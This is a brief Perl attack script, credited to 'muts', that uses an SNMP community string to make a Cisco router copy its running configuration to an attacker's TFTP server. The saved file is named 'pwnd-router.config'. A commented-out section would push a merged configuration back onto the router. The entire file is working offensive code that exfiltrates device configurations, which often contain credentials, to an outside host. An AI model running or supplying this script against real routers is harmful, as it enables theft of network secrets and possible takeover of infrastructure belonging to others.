#!/usr/bin/perl
if ($#ARGV != 2) {
 print "\n######################################################\n";
 print "# Copy Cisco Router config  - Using SNMP\n";
 print "# Hacked up by muts - muts\@whitehat.co.il\n";
 print "#######################################################\n";

 print "\nUsage : ./cisco-copy-config.pl <router-ip> <tftp-serverip> <community> \n";
 print "\nMake sure a TFTP server is set up, prefferably running from /tmp ! \n\n";
 exit;
}

use Cisco::CopyConfig;

    $|          = 1; # autoflush output
    $tftp       = $ARGV[1];
#    $merge_f    = 'new-config.upload';
    $copy_f     = 'pwnd-router.config';
    $host       = $ARGV[0];;
    $comm       = $ARGV[2];;
    $config     = Cisco::CopyConfig->new(
                     Host => $host,
                     Comm => $comm
    );
    $path       = "/tmp/${copy_f}"; 

    open(COPY_FH, "> $path") || die $!;
    close(COPY_FH); chmod 0666, $path || die $!;

#    print "${tftp}:${merge_f} -> ${host}:running-config... ";
#    if ($config->merge($tftp, $merge_f)) {  # merge the new config
#      print "OK\n";
#    } else {
#      die $config->error();
#    }
    print "${host}:running-config -> ${tftp}:${copy_f}... ";
    if ($config->copy($tftp, $copy_f)) {    # copy the updated config
      print "OK\n";
    } else {
      die $config->error();
    }
